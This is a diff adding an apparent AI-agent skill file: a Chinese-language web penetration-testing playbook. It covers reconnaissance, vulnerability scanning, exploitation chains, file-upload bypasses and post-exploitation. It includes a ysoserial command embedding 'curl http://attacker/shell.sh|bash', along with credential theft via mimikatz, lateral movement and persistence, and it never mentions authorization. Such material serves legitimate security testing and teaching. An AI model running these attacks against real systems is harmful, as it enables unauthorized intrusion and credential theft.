@@ -1,0 +1,112 @@
+---
+name: web渗透攻击v2
+description: Use when encountering web应用渗透方法论 - 并行信息收集、漏洞发现、漏洞利用
+---
+
+# Web渗透攻击V2
+
+## Info
+
+- **Domain**: web
+- **Tags**: web, http, injection, reconnaissance
+
+## 核心原则
+```
+并行优先: 独立任务同时执行
+渐进深入: 信息收集 → 漏洞发现 → 漏洞利用
+结果验证: 每个发现需独立验证
+```
+
+## 信息收集矩阵(可并行)
+
+| 任务 | 工具 | 输出 |
+|------|------|------|
+| 端口扫描 | nmap -sV -sC --top-ports 1000 | 服务列表 |
+| HTTP探测 | httpx -json -status-code -title | Web资产 |
+| 技术栈 | whatweb -v | 框架识别 |
+| 目录枚举 | ffuf -w wordlist -fc 404 | 路径列表 |
+| 子域名 | subfinder -silent | 子域名列表 |
+| CVE扫描 | nuclei -t cve/ -silent | 已知漏洞 |
+
+```bash
+# 并行执行示例
+nmap -sV -sC target &
+httpx -l hosts.txt -json -o httpx.json &
+ffuf -u http://target/FUZZ -w wordlist -o ffuf.json &
+wait
+```
+
+## 漏洞发现矩阵(可并行)
+
+| 漏洞类型 | 工具 | 参数 |
+|----------|------|------|
+| SQL注入 | sqlmap | --batch --level=3 --risk=2 |
+| XSS | dalfox | --blind --no-spinner |
+| 配置错误 | nuclei | -t misconfiguration/ |
+| 敏感文件 | ffuf | -w wordlist:敏感文件列表 |
+| SSRF | 自定义 | 参数替换测试 |
+
+```bash
+# 并行扫描
+sqlmap -u "http://target?id=1" --batch &
+dalfox url http://target --blind &
+nuclei -u http://target -t cve/,misconfiguration/ &
+wait
+```
+
+## 漏洞利用(需串行)
+
+| 漏洞 | 利用链 | 关键步骤 |
+|------|--------|----------|
+| SQL注入 | 数据提取→权限提升→RCE | xp_cmdshell/load_file |
+| 文件上传 | 绕过限制→WebShell→RCE | 扩展名/内容/路径绕过 |
+| 反序列化 | 链构造→RCE→持久化 | ysoserial/phpggc |
+| 命令注入 | 参数注入→RCE→提权 | 特殊字符绕过 |
+| SSTI | 模板识别→RCE | 引擎特定payload |
+
+## 反序列化攻击
+
+| 语言 | 工具 | 常见链 |
+|------|------|--------|
+| Java | ysoserial | Commons-Collections, Spring |
+| PHP | phpggc | Laravel, Symfony, Magento |
+| Python | pickle反序列化 | __reduce__利用 |
+| .NET | ysoserial.net | ObjectStateFormatter |
+
+```bash
+# Java反序列化
+java -jar ysoserial.jar CommonsCollections1 'curl http://attacker/shell.sh|bash' > payload.ser
+
+# PHP反序列化
+phpggc Laravel/RCE1 'system("id")' > payload.txt
+```
+
+## 文件上传绕过矩阵
+
+| 限制类型 | 绕过方法 |
+|----------|----------|
+| 扩展名黑名单 | phtml, php5, php7, phar |
+| 扩展名白名单 | 双扩展名: shell.php.jpg |
+| 内容检测 | 图片头+PHP代码 |
+| MIME检测 | 修改Content-Type |
+| 路径检测 | %00截断/路径穿越 |
+| 重命名检测 | 快速竞争访问 |
+
+## 后渗透矩阵
+
+| 任务 | 工具 | 目标 |
+|------|------|------|
+| 信息收集 | linpeas/winpeas | 可利用点 |
+| 凭据提取 | mimikatz/LaZagne | 密码/Hash |
+| 网络探测 | nmap -sn | 内网主机 |
+| 横向移动 | PsExec/WMI | 其他主机 |
+| 权限提升 | 内核漏洞/配置错误 | root/admin |
+
+## 时间管理
+
+| 阶段 | 建议时间 | 说明 |
+|------|----------|------|
+| 信息收集 | 15% | 全面的资产发现 |
+| 漏洞发现 | 30% | 自动化+手工验证 |
+| 漏洞利用 | 35% | 深度利用 |
+| 后渗透 | 20% | 横向/提权/持久化 |
